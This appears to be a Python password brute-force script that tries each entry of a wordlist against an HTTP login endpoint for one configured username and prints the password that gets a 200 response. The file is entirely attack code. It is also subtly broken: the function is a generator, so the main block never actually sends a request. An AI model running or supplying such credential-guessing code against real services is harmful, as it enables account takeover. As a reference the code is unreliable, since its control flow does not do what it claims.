import time

import requests

from config import HTTP_HOST, HTTP_PORT, HTTP_USERNAME


def run_attack():

    url = f"http://{HTTP_HOST}:{HTTP_PORT}/api/auth/login"

    with open("wordlists/passwords.txt") as file:

        for password in file:

            password = password.strip()

            if not password:
                continue

            print(f"Trying: {HTTP_USERNAME}:{password}")

            result = requests.post(
                url,
                json={
                    "username": HTTP_USERNAME,
                    "password": password,
                },
            )

            yield result

            if result.status_code == 200:
                print(f"[+] Password found: {password}")
                return result

            time.sleep(1)


if __name__ == "__main__":
    run_attack()